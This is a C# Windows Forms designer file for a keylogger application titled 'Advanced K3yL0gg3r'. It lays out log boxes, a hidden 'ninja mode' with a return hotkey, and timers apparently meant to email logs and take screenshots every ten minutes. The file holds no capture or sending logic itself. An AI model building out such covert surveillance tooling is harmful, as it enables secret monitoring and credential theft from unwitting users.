﻿using System.Windows.Forms;
namespace KeyLogger
{
    partial class FrmMain
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.txt_Log = new System.Windows.Forms.TextBox();
            this._timer = new System.Windows.Forms.Timer(this.components);
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.labelMousePosition = new System.Windows.Forms.ToolStripStatusLabel();
            this.btn_Exit = new System.Windows.Forms.Button();
            this.btn_hide = new System.Windows.Forms.Button();
            this.txt_CurrentWindowstitle = new System.Windows.Forms.TextBox();
            this.txt_MouseLog = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.btnStop = new System.Windows.Forms.Button();
            this.btnStart = new System.Windows.Forms.Button();
            this.timer_emailer = new System.Windows.Forms.Timer(this.components);
            this.timer_logsaver = new System.Windows.Forms.Timer(this.components);
            this.main_Menu = new System.Windows.Forms.MainMenu(this.components);
            this.menuItem1 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Hide = new System.Windows.Forms.MenuItem();
            this.mnuItem_Save = new System.Windows.Forms.MenuItem();
            this.menuItem3 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Exit = new System.Windows.Forms.MenuItem();
            this.menuItem5 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Settings = new System.Windows.Forms.MenuItem();
            this.menuItem6 = new System.Windows.Forms.MenuItem();
            this.mnuItem_About = new System.Windows.Forms.MenuItem();
            this.timer_screenshot = new System.Windows.Forms.Timer(this.components);
            this.statusStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // txt_Log
            // 
            this.txt_Log.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txt_Log.Location = new System.Drawing.Point(6, 134);
            this.txt_Log.Multiline = true;
            this.txt_Log.Name = "txt_Log";
            this.txt_Log.ReadOnly = true;
            this.txt_Log.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_Log.Size = new System.Drawing.Size(334, 120);
            this.txt_Log.TabIndex = 7;
            // 
            // _timer
            // 
            this._timer.Enabled = true;
            // 
            // statusStrip1
            // 
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.labelMousePosition});
            this.statusStrip1.Location = new System.Drawing.Point(0, 350);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
            this.statusStrip1.Size = new System.Drawing.Size(349, 22);
            this.statusStrip1.TabIndex = 9;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // labelMousePosition
            // 
            this.labelMousePosition.Name = "labelMousePosition";
            this.labelMousePosition.Size = new System.Drawing.Size(93, 17);
            this.labelMousePosition.Text = "MOUSE Position";
            // 
            // btn_Exit
            // 
            this.btn_Exit.Location = new System.Drawing.Point(180, 52);
            this.btn_Exit.Name = "btn_Exit";
            this.btn_Exit.Size = new System.Drawing.Size(155, 28);
            this.btn_Exit.TabIndex = 10;
            this.btn_Exit.Text = "Exit";
            // 
            // btn_hide
            // 
            this.btn_hide.Location = new System.Drawing.Point(13, 52);
            this.btn_hide.Name = "btn_hide";
            this.btn_hide.Size = new System.Drawing.Size(155, 28);
            this.btn_hide.TabIndex = 11;
            this.btn_hide.Text = "Hide";
            this.btn_hide.Click += new System.EventHandler(this.btn_hide_Click);
            // 
            // txt_CurrentWindowstitle
            // 
            this.txt_CurrentWindowstitle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txt_CurrentWindowstitle.Location = new System.Drawing.Point(6, 108);
            this.txt_CurrentWindowstitle.Name = "txt_CurrentWindowstitle";
            this.txt_CurrentWindowstitle.ReadOnly = true;
            this.txt_CurrentWindowstitle.Size = new System.Drawing.Size(334, 22);
            this.txt_CurrentWindowstitle.TabIndex = 13;
            this.txt_CurrentWindowstitle.Text = "Current Window Title";
            // 
            // txt_MouseLog
            // 
            this.txt_MouseLog.Location = new System.Drawing.Point(6, 260);
            this.txt_MouseLog.Multiline = true;
            this.txt_MouseLog.Name = "txt_MouseLog";
            this.txt_MouseLog.ReadOnly = true;
            this.txt_MouseLog.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_MouseLog.Size = new System.Drawing.Size(334, 87);
            this.txt_MouseLog.TabIndex = 14;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.DodgerBlue;
            this.label1.Location = new System.Drawing.Point(10, 83);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(318, 13);
            this.label1.TabIndex = 15;
            this.label1.Text = "Hotkey to return from ninja mode : Ctrl+Alt+Shift + (F12,F11,F10)";
            // 
            // btnStop
            // 
            this.btnStop.Image = global::KeyLogger.Properties.Resources.DeleteRed;
            this.btnStop.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnStop.Location = new System.Drawing.Point(180, 12);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new System.Drawing.Size(155, 34);
            this.btnStop.TabIndex = 5;
            this.btnStop.Text = "Stop";
            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
            // 
            // btnStart
            // 
            this.btnStart.Image = global::KeyLogger.Properties.Resources.Begin;
            this.btnStart.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnStart.Location = new System.Drawing.Point(13, 12);
            this.btnStart.Name = "btnStart";
            this.btnStart.Size = new System.Drawing.Size(155, 34);
            this.btnStart.TabIndex = 4;
            this.btnStart.Text = "Start";
            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
            // 
            // timer_emailer
            // 
            this.timer_emailer.Interval = 600000;
            this.timer_emailer.Tick += new System.EventHandler(this.timer_emailer_Tick);
            // 
            // timer_logsaver
            // 
            this.timer_logsaver.Interval = 600000;
            this.timer_logsaver.Tick += new System.EventHandler(this.timer_logsaver_Tick);
            // 
            // main_Menu
            // 
            this.main_Menu.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.menuItem1,
            this.menuItem5,
            this.menuItem6});
            // 
            // menuItem1
            // 
            this.menuItem1.Index = 0;
            this.menuItem1.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.mnuItem_Hide,
            this.mnuItem_Save,
            this.menuItem3,
            this.mnuItem_Exit});
            this.menuItem1.Text = "&Main";
            // 
            // mnuItem_Hide
            // 
            this.mnuItem_Hide.Index = 0;
            this.mnuItem_Hide.Text = "&Hide";
            // 
            // mnuItem_Save
            // 
            this.mnuItem_Save.Index = 1;
            this.mnuItem_Save.Text = "&Save";
            this.mnuItem_Save.Click += new System.EventHandler(this.mnuItem_Save_Click);
            // 
            // menuItem3
            // 
            this.menuItem3.Index = 2;
            this.menuItem3.Text = "-";
            // 
            // mnuItem_Exit
            // 
            this.mnuItem_Exit.Index = 3;
            this.mnuItem_Exit.Text = "E&xit";
            // 
            // menuItem5
            // 
            this.menuItem5.Index = 1;
            this.menuItem5.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.mnuItem_Settings});
            this.menuItem5.Text = "&Options";
            // 
            // mnuItem_Settings
            // 
            this.mnuItem_Settings.Index = 0;
            this.mnuItem_Settings.Text = "Set&tings";
            this.mnuItem_Settings.Click += new System.EventHandler(this.mnuItem_Settings_Click);
            // 
            // menuItem6
            // 
            this.menuItem6.Index = 2;
            this.menuItem6.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.mnuItem_About});
            this.menuItem6.Text = "&Help";
            // 
            // mnuItem_About
            // 
            this.mnuItem_About.Index = 0;
            this.mnuItem_About.Text = "&About";
            this.mnuItem_About.Click += new System.EventHandler(this.mnuItem_About_Click);
            // 
            // timer_screenshot
            // 
            this.timer_screenshot.Interval = 600000;
            this.timer_screenshot.Tick += new System.EventHandler(this.timer_screenshot_Tick);
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.ClientSize = new System.Drawing.Size(349, 372);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.txt_MouseLog);
            this.Controls.Add(this.txt_CurrentWindowstitle);
            this.Controls.Add(this.btn_hide);
            this.Controls.Add(this.btn_Exit);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.txt_Log);
            this.Controls.Add(this.btnStop);
            this.Controls.Add(this.btnStart);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Menu = this.main_Menu;
            this.Name = "FrmMain";
            this.RightToLeftLayout = true;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Advanced K3yL0gg3r";
            this.TopMost = true;
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox txt_Log;
        private System.Windows.Forms.Button btnStop;
        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Timer _timer;
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.ToolStripStatusLabel labelMousePosition;
        private System.Windows.Forms.Button btn_Exit;
        private System.Windows.Forms.Button btn_hide;
        private TextBox txt_CurrentWindowstitle;
        private TextBox txt_MouseLog;
        private Label label1;
        private Timer timer_emailer;
        private Timer timer_logsaver;
        private MainMenu main_Menu;
        private MenuItem menuItem1;
        private MenuItem mnuItem_Hide;
        private MenuItem menuItem3;
        private MenuItem mnuItem_Exit;
        private MenuItem menuItem5;
        private MenuItem menuItem6;
        private MenuItem mnuItem_About;
        private MenuItem mnuItem_Settings;
        private MenuItem mnuItem_Save;
        private Timer timer_screenshot;
    }
}

